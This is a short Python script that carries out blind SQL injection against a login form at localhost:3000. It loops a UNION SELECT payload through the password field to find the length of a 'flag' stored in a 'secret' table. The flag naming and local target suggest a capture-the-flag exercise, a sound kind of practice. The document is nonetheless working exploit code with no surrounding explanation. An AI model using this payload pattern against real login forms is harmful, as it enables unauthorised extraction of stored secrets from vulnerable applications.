import requests


url="http://localhost:3000/login"

for length in range(1,100):
    payload =  f"' UNION SELECT flag, 1 from secret where length(flag) = {length}--"
    response = requests.post(
        url,
        data={
        "username": "admin",
        "password": payload
        }
    )

    print(response.text)
    if "Hello, user!" in response.text:
        answer =  length
        break


print(answer)


